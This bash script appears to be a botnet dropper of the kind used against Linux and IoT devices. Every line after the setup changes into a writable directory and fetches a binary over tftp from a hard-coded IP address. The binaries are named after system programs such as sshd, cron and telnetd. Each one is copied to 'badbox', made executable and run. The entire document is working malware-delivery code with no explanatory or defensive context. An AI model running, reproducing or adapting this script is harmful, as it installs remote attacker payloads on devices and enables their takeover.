#!/bin/bash
ulimit -n 1024
cp /bin/busybox /tmp/
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.191.48.91 -c get ntpd;cat ntpd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.191.48.91 -c get sshd;cat sshd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.191.48.91 -c get openssh;cat openssh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.191.48.91 -c get bash;cat bash >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.191.48.91 -c get tftp;cat tftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.191.48.91 -c get wget;cat wget >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.191.48.91 -c get cron;cat cron >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.191.48.91 -c get ftp;cat ftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.191.48.91 -c get pftp;cat pftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.191.48.91 -c get sh;cat sh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.191.48.91 -c get ' ';cat ' ' >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.191.48.91 -c get apache2;cat apache2 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.191.48.91 -c get telnetd;cat telnetd >badbox;chmod +x *;./badbox
